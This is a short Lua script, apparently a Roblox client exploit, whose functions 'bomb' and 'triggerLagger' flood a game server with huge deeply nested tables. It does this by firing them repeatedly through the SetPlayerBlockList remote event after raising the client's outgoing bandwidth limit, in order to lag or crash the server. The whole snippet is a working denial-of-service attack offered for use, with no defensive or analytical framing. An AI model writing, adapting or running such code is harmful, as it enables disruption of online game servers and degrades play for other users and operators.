local function bomb(amt)
    local main = {}
    local spam = {{}}
    local z = spam[1]
    for i = 1, amt do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local max = math.min(499999 / (amt + 2), 1500)
    for i = 1, max do
        table.insert(main, spam)
    end
    pcall(function()
        if ReplicatedStorage and ReplicatedStorage.SetPlayerBlockList then
            ReplicatedStorage.SetPlayerBlockList:FireServer(main)
        end
    end)
end

local function triggerLagger()
    if not effectEnabled then return end
    task.spawn(function()
        pcall(function()
            if game:GetService("NetworkClient") then
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(25000)
            end
        end)
        local start = tick()
        while (tick() - start) < 0.5 and effectEnabled do
            bomb(lagPower)
            task.wait(0.07)
        end
    end)
end

